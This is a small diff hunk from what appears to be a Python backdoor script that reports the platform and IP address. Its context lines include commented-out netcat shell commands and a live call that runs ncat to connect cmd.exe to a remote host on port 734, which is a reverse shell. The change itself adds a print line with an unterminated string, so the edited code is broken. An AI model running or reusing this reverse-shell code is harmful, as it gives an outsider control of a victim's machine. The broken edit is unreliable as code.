@@ -27,7 +27,7 @@ def run():
         #os.system( 'nc -lvp 734 -e /bin/sh')
         #os.system('nc' + iph+ ' 734 -e /bin/sh')
     elif "Windows" in platform.system():
-        print('Windows: ', sysconfig.get_platform()) 
+        print('Windows: ', sysconfig.get_platform(),' === Co) 
         print('Address ip: ', IPAddr)
         #os.system('ncat -lvp 734 -e cmd.exe')
         os.system('ncat '+ iph +' 734 -e cmd.exe')
